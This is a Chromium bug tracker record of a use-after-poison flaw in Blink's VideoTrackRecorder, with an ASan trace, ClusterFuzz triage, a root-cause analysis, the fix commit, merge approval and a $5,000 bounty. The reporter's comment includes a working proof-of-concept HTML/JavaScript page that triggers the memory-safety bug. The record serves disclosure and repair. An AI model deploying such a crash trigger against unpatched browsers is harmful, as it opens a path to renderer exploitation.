# Security: use-after-poison in  blink::VideoTrackRecorder::InitializeEncoder

| Field | Value |
|-------|-------|
| **Issue ID** | [40095922](https://issues.chromium.org/issues/40095922) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>MediaRecording |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | jo...@microsoft.com |
| **Assignee** | gu...@chromium.org |
| **Created** | 2019-08-06 |
| **Bounty** | $5,000.00 |

## Description

**-------------------------**

**VULNERABILITY DETAILS**  

have not root caused this one yet. Will update after i dig in a bit more.

**VERSION**  

Chrome Version: commit 6c8dec6ff4d51641cf249450fc797f0f03241681  

Operating System: Windows 10 x64

**REPRODUCTION CASE**  

repro with .\chrome.exe --no-sandbox --js-flags=--expose-gc crash.html

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: render process crashes  

ASAN Output:

=================================================================  

==17240==ERROR: AddressSanitizer: use-after-poison on address 0x7ea17fd6cc78 at pc 0x7ffef53b6bde bp 0x009df87fe580 sp 0x009df87fe5c8  

READ of size 8 at 0x7ea17fd6cc78 thread T0  

==17240==\*\*\* WARNING: Failed to initialize DbgHelp! \*\*\*  

==17240==\*\*\* Most likely this means that the app is already \*\*\*  

==17240==\*\*\* using DbgHelp, possibly with incompatible flags. \*\*\*  

==17240==\*\*\* Due to technical reasons, symbolization might crash \*\*\*  

==17240==\*\*\* or produce wrong results. \*\*\*  

#0 0x7ffef53b6bdd in blink::VideoTrackRecorder::InitializeEncoder F:\chromium\src\third\_party\blink\renderer\modules\mediarecorder\video\_track\_recorder.cc:497  

#1 0x7ffef53bafec in base::internal::FunctorTraits<void (blink::VideoTrackRecorder::\*)(blink::VideoTrackRecorder::CodecId, const base::RepeatingCallback<void (const media::WebmMuxer::VideoParameters &, std::\_\_1::basic\_string<char>, std::\_\_1::basic\_string<char>, base::TimeTicks, bool)> &, int, bool, scoped\_refptr[media::VideoFrame](javascript:void(0);), base::TimeTicks),void>::Invoke<void (blink::VideoTrackRecorder::\*)(blink::VideoTrackRecorder::CodecId, const base::RepeatingCallback<void (const media::WebmMuxer::VideoParameters &, std::\_\_1::basic\_string<char>, std::\_\_1::basic\_string<char>, base::TimeTicks, bool)> &, int, bool, scoped\_refptr[media::VideoFrame](javascript:void(0);), base::TimeTicks),const base::WeakPtr[blink::VideoTrackRecorder](javascript:void(0);) &,const blink::VideoTrackRecorder::CodecId &,const base::RepeatingCallback<void (const media::WebmMuxer::VideoParameters &, std::\_\_1::basic\_string<char>, std::\_\_1::basic\_string<char>, base::TimeTicks, bool)> &,const int &,bool,scoped\_refptr[media::VideoFrame](javascript:void(0);),base::TimeTicks> F:\chromium\src\base\bind\_internal.h:499  

#2 0x7ffef53bacd3 in base::internal::Invoker<base::internal::BindState<void (blink::VideoTrackRecorder::\*)(blink::VideoTrackRecorder::CodecId, const base::RepeatingCallback<void (const media::WebmMuxer::VideoParameters &, std::\_\_1::basic\_string<char>, std::\_\_1::basic\_string<char>, base::TimeTicks, bool)> &, int, bool, scoped\_refptr[media::VideoFrame](javascript:void(0);), base::TimeTicks),base::WeakPtr[blink::VideoTrackRecorder](javascript:void(0);),blink::VideoTrackRecorder::CodecId,base::RepeatingCallback<void (const media::WebmMuxer::VideoParameters &, std::\_\_1::basic\_string<char>, std::\_\_1::basic\_string<char>, base::TimeTicks, bool)>,int>,void (bool, scoped\_refptr[media::VideoFrame](javascript:void(0);), base::TimeTicks)>::Run F:\chromium\src\base\bind\_internal.h:654  

#3 0x7ffef53b7268 in base::RepeatingCallback<void (bool, scoped\_refptr[media::VideoFrame](javascript:void(0);), base::TimeTicks)>::Run F:\chromium\src\base\callback.h:132  

#4 0x7ffef53bb4b5 in base::internal::Invoker<base::internal::BindState<base::RepeatingCallback<void (bool, scoped\_refptr[media::VideoFrame](javascript:void(0);), base::TimeTicks)>,bool>,void (scoped\_refptr[media::VideoFrame](javascript:void(0);), base::TimeTicks)>::Run F:\chromium\src\base\bind\_internal.h:654  

#5 0x7ffef374ca7e in base::RepeatingCallback<void (scoped\_refptr[media::VideoFrame](javascript:void(0);), base::TimeTicks)>::Run F:\chromium\src\base\callback.h:143  

#6 0x7ffef374c79e in base::internal::Invoker<base::internal::BindState<base::RepeatingCallback<void (scoped\_refptr[media::VideoFrame](javascript:void(0);), base::TimeTicks)>,scoped\_refptr[media::VideoFrame](javascript:void(0);),base::TimeTicks>,void ()>::RunOnce F:\chromium\src\base\bind\_internal.h:641  

#7 0x7ffee8834a1a in base::TaskAnnotator::RunTask F:\chromium\src\base\task\common\task\_annotator.cc:142  

#8 0x7ffeeabe32fe in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:365  

#9 0x7ffeeabe255b in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:219  

#10 0x7ffeeab97148 in base::MessagePumpDefault::Run F:\chromium\src\base\message\_loop\message\_pump\_default.cc:39  

#11 0x7ffeeabe5c84 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:463  

#12 0x7ffee87d6c88 in base::RunLoop::RunWithTimeout F:\chromium\src\base\run\_loop.cc:160  

#13 0x7ffeea9cbceb in content::RendererMain F:\chromium\src\content\renderer\renderer\_main.cc:212  

#14 0x7ffee857b4b3 in content::ContentMainRunnerImpl::Run F:\chromium\src\content\app\content\_main\_runner\_impl.cc:871  

#15 0x7ffee86e9976 in service\_manager::Main F:\chromium\src\services\service\_manager\embedder\main.cc:423  

#16 0x7ffee857910f in content::ContentMain F:\chromium\src\content\app\content\_main.cc:19  

#17 0x7ffee1f613a5 in ChromeMain F:\chromium\src\chrome\app\chrome\_main.cc:110  

#18 0x7ff65fc47d7c in MainDllLoader::Launch F:\chromium\src\chrome\app\main\_dll\_loader\_win.cc:202  

#19 0x7ff65fc42cbd in main F:\chromium\src\chrome\app\chrome\_exe\_main\_win.cc:234  

#20 0x7ff66007260b in \_\_scrt\_common\_main\_seh d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\startup\exe\_common.inl:288  

#21 0x7fff5e547973 in BaseThreadInitThunk+0x13 (C:\windows\System32\KERNEL32.DLL+0x180017973)  

#22 0x7fff6109a270 in RtlUserThreadStart+0x20 (C:\windows\SYSTEM32\ntdll.dll+0x18006a270)

Address 0x7ea17fd6cc78 is a wild pointer.  

SUMMARY: AddressSanitizer: use-after-poison F:\chromium\src\third\_party\blink\renderer\modules\mediarecorder\video\_track\_recorder.cc:497 in blink::VideoTrackRecorder::InitializeEncoder  

Shadow bytes around the buggy address:  

0x11fd2d8ad930: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 06 f7 f7 f7 f7  

0x11fd2d8ad940: f7 f7 f7 f7 f7 06 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x11fd2d8ad950: 06 f7 f7 f7 f7 f7 f7 f7 f7 06 f7 f7 f7 f7 f7 f7  

0x11fd2d8ad960: f7 f7 f7 f7 f7 06 00 00 00 00 00 00 00 00 00 00  

0x11fd2d8ad970: 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

=>0x11fd2d8ad980: 06 00 00 00 00 00 00 00 00 00 00 06 f7 f7 f7[f7]  

0x11fd2d8ad990: f7 f7 f7 f7 f7 06 00 00 00 00 00 00 00 00 00 00  

0x11fd2d8ad9a0: 06 00 00 00 00 00 00 00 00 00 00 00 00 06 00 00  

0x11fd2d8ad9b0: 00 00 00 00 00 00 00 00 06 00 00 00 00 00 00 00  

0x11fd2d8ad9c0: 00 00 00 00 00 06 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x11fd2d8ad9d0: f7 04 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==17240==ABORTING

**CREDIT INFORMATION**  

Reporter credit: Johnathan Norman Microsoft Vulnerability Research

## Attachments

- [asan_output.txt](attachments/asan_output.txt) (text/plain, 6.8 KB)
- [crash.html](attachments/crash.html) (text/plain, 614 B)
- [empty.html](attachments/empty.html) (text/plain, 0 B)

## Timeline

### cl...@chromium.org (2019-08-07)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5198533642027008.

### cl...@chromium.org (2019-08-07)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-08-07)

ClusterFuzz testcase 5198533642027008 appears to be flaky, updating reproducibility label.

### cl...@chromium.org (2019-08-07)

Detailed report: <https://clusterfuzz.com/testcase?key=5198533642027008>

Job Type: windows\_asan\_chrome\_no\_sandbox  

Platform Id: windows

Crash Type: Use-after-poison READ 8  

Crash Address: 0x7ed30068e030  

Crash State:  

blink::VideoTrackRecorder::InitializeEncoder  

??$Invoke@P8VideoTrackRecorder@blink@@EAAXW4CodecId@12@AEBV?$RepeatingCallback@$  

?Run@?$Invoker@U?$BindState@P8VideoTrackRecorder@blink@@EAAXW4CodecId@12@AEBV?$R

Sanitizer: address (ASAN)

Recommended Security Severity: High

Reproducer Testcase: <https://clusterfuzz.com/download?testcase_id=5198533642027008>

Additional requirements: Requires HTTP

See <https://github.com/google/clusterfuzz-tools> for instructions to reproduce this bug locally.

**Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days we've been seeing this crash frequently. If you are unable to reproduce this, please try a speculative fix based on the crash stacktrace in the report. The fix can be verified by looking at the crash statistics in the report, a day after the fix is deployed. We will auto-close the bug if the crash is not seen for 14 days.**

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### sh...@chromium.org (2019-08-08)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ke...@chromium.org (2019-08-08)

Cluster-fuzz can reproduce but it's flaky, so it is harder to know if this is a recent regression.

guidou@ can you please help triage this?

[Monorail components: -Blink>DOM Blink>MediaRecording]

### gu...@chromium.org (2019-08-09)

grunell@: Can you take a look?

### jd...@chromium.org (2019-08-18)

Hi folks. Any update on this?

jonorman@: have you had a chance to dig into the root cause?

Thanks!
-Your friendly security sheriff.

### mm...@google.com (2019-08-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-08-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-08-21)

grunell: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### jo...@microsoft.com (2019-08-23)

I'm still learning my way around the code base so i could be wrong here 

looking at this crash in the debugger it seems |track_| which is a raw pointer is pointing to 0  
https://cs.chromium.org/chromium/src/third_party/blink/renderer/modules/mediarecorder/video_track_recorder.cc?sq=package:chromium&g=0&l=433

track is also a Member object which is on the Oilpan heap 

// We need to hold on to the Blink track to remove ourselves on dtor.
  Member<MediaStreamComponent> track_;
  // Inner class to encode using whichever codec is configured.
  scoped_refptr<Encoder> encoder_;



So my guess is when we called VideoTrackRecorder destructor, it'll free the memory held by  |_tracks| and ASan will poison its memory, then the callback happens but the destructor was called  , the object isn't freed yet  

void VideoTrackRecorder::Prefinalize() {
  // TODO(crbug.com/704136) : Remove this method when moving
  // MediaStreamVideoTrack to Oilpan's heap.
  DCHECK_CALLED_ON_VALID_THREAD(main_thread_checker_);
  DisconnectFromTrack();
  track_ = nullptr;
}



here is a POC that is a bit more readable. 

<script>
function start() {
	canvasElement=document.createElement('canvas');
	canvasContext=canvasElement.getContext('2d');
	o14=window.open('empty.html','popup73'+Math.random(),'left=26,outerHeight=55,toolbar,resizable');
	o15=window.open('empty.html','popup10'+Math.random(),'outerWidth=8,menubar');
	// after our timeout start the party 
	window.setTimeout(fun0,4);
}
function fun0() {
	o97=canvasContext.fillText(undefined,77,1);
	mediaStream=canvasElement.captureStream(7935);
	mediaTracksArray=mediaStream.getTracks();
	// go through each array element and run fun1 over it
	o255=mediaTracksArray.forEach(fun1);
	// stop recording media stream
	o1146=mediaRecorder.stop();
	// creates memory pressure to trigger GC 
	o1171=new ImageData(26,2097152);
	// reload the page over and over again because i'm a horrible person. 
	// when this happens all pending callbacks are called and then freed 
	location.reload();
}
function fun1() {
	mediaRecorder=new MediaRecorder(mediaStream);
	mediaRecorder.start();
}
</script>
<body onload="start()"></body>


### gu...@chromium.org (2019-08-26)

[Empty comment from Monorail migration]

### gu...@chromium.org (2019-08-26)

[Empty comment from Monorail migration]

### gu...@chromium.org (2019-09-03)

I have been unable to reproduce so far, but I believe the bug is caused by |initialize_encoder_callback_| initialized with a callback bound to a weak pointer produced by a WeakPtrFactory, but such weak pointers get invalidated upon destruction, not upon prefinalization. Weak pointers produced with WrapWeakPersistent should be used instead.
The WeakPtrFactory should have been removed when VideoTrackRecorder was made GC, but this detail was overlooked.
I'll send a patch for review that removes the WeakPtrFactory, which should be done anyway. 


### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-09-03)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/d83634dcf6781f39fe8fd2601582d709e4597ff5

commit d83634dcf6781f39fe8fd2601582d709e4597ff5
Author: Guido Urdaneta <guidou@chromium.org>
Date: Tue Sep 03 18:29:23 2019

[MediaRecorder] Remove WeakPtrFactory from VideoTrackRecorder.

This class is now garbage-collected, so the WeakPtrFactory is
unnecessary and buggy, since weak pointers from it get invalidated
upon destruction, but not upon prefinalization. This can lead to
use-after-poison issues.

Bug: 991321
Change-Id: Ib8d5581e6e3d2aed4c32fb1e77e78e0e7f42e92e
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1782877
Reviewed-by: Kentaro Hara <haraken@chromium.org>
Commit-Queue: Guido Urdaneta <guidou@chromium.org>
Cr-Commit-Position: refs/heads/master@{#692743}

[modify] https://crrev.com/d83634dcf6781f39fe8fd2601582d709e4597ff5/third_party/blink/renderer/modules/mediarecorder/video_track_recorder.cc
[modify] https://crrev.com/d83634dcf6781f39fe8fd2601582d709e4597ff5/third_party/blink/renderer/modules/mediarecorder/video_track_recorder.h


### cl...@chromium.org (2019-09-03)

ClusterFuzz testcase 5198533642027008 is verified as fixed in https://clusterfuzz.com/revisions?job=windows_asan_chrome_no_sandbox&range=692742:692747

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2019-09-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-09-04)

Requesting merge to beta M77 because latest trunk commit (692743) appears to be after beta branch point (681094).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-09-04)

This bug requires manual review: We are only 5 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://goto.google.com/chrome-release-branch-merge-guidelines
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), dgagnon@(ChromeOS), lakpamarthy@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### la...@google.com (2019-09-04)

guidou@ - please respond to C#20 to consider the merge request

### gu...@chromium.org (2019-09-04)

1. Does your merge fit within the Merge Decision Guidelines?
Yes. It fixes an issue with Secrurty_Severity High.

2. Links to the CLs you are requesting to merge.
r692743

3. Has the change landed and been verified on master/ToT?
Yes, it has. Clusterfuzz marked it as Verified.

4. Why are these changes required in this milestone after branch?
To fix a security issue.

5. Is this a new feature?
No.

6. If it is a new feature, is it behind a flag using finch?
N/A

### la...@google.com (2019-09-05)

merge approved for M77 branch 3865

### gu...@chromium.org (2019-09-05)

The merge landed here: https://chromium-review.googlesource.com/c/chromium/src/+/1785397

### be...@chromium.org (2019-09-05)

Removing merge label as this is merged as per c#24

### gu...@chromium.org (2019-09-06)

[Empty comment from Monorail migration]

### gu...@chromium.org (2019-09-06)

Added Merge-Merged label. No idea why the bug did not get updated automatically after the merge.

### na...@google.com (2019-09-06)

[Empty comment from Monorail migration]

### na...@google.com (2019-09-16)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### pa...@chromium.org (2019-09-16)

Congrats! The Panel decided to reward $5,000 for this report! 

### aw...@google.com (2019-10-07)

[Comment Deleted]

### aw...@google.com (2019-10-07)

[Comment Deleted]

### sh...@chromium.org (2019-12-11)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### na...@google.com (2020-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2020-01-08)

This issue was migrated from crbug.com/chromium/991321?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095922)*
